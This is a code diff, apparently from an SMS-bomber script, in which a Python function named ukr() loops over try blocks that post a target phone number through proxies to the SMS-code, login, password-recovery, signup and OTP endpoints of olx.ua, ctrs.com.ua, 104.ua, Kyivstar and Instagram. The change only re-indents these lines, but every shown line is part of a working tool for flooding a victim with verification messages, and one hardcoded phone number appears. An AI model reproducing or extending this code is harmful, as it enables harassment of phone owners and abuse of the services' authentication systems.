@@ -137,36 +137,36 @@ def ukr():
                 except:
                         pass
                 try:
-                formatted_phone = format_phone(number, "+###+##+###+##+##")
-                 requests.post("https://www.olx.ua/account/?phone=380966579780", json={"number": number}, headers=headers, proxies=proxies)
+                        formatted_phone = format_phone(number, "+###+##+###+##+##")
+                        requests.post("https://www.olx.ua/account/?phone=380966579780", json={"number": number}, headers=headers, proxies=proxies)
                 except:
                         pass
                 try:
-                 requests.post("https://www.olx.ua/account/?phone", json={"number": number}, headers=headers, proxies=proxies)
+                        requests.post("https://www.olx.ua/account/?phone", json={"number": number}, headers=headers, proxies=proxies)
                 except:
                         pass
                 try:
-                       requests.post("https://www.olx.ua/account/forgotpassword/?bs=login_page_forgot_password_button&prefilledUsername=MzgwOTY2NTc5Nzgw", json={"phone": "+" + number}, headers=headers, proxies=proxies)
+                        requests.post("https://www.olx.ua/account/forgotpassword/?bs=login_page_forgot_password_button&prefilledUsername=MzgwOTY2NTc5Nzgw", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                 except:
                         pass
                 try:
-                       requests.post("https://my.ctrs.com.ua/ru/auth/sms_code", json={"phone": "+" + number}, headers=headers, proxies=proxies)
+                        requests.post("https://my.ctrs.com.ua/ru/auth/sms_code", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                 except:
                         pass
                 try:
-                      requests.post("https://my.ctrs.com.ua/ru/auth/login", json={"phone": "+" + number}, headers=headers, proxies=proxies)
+                        requests.post("https://my.ctrs.com.ua/ru/auth/login", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                 except:
                         pass
                 try:
-                       requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", json={"phone": "+" + number}, headers=headers, proxies=proxies)
+                        requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                 except:
                         pass
                 try:
-                       requests.post("https://account.104.ua/signup?step=3", json={"phone": "+" + number}, headers=headers, proxies=proxies)
+                        requests.post("https://account.104.ua/signup?step=3", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                 except:
                         pass
                 try:
-                       requests.post("https://account.kyivstar.ua/cas/auth/otp.rpc", json={"phone": "+" + number}, headers=headers, proxies=proxies)
+                        requests.post("https://account.kyivstar.ua/cas/auth/otp.rpc", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                 except:
                         pass
                 try:
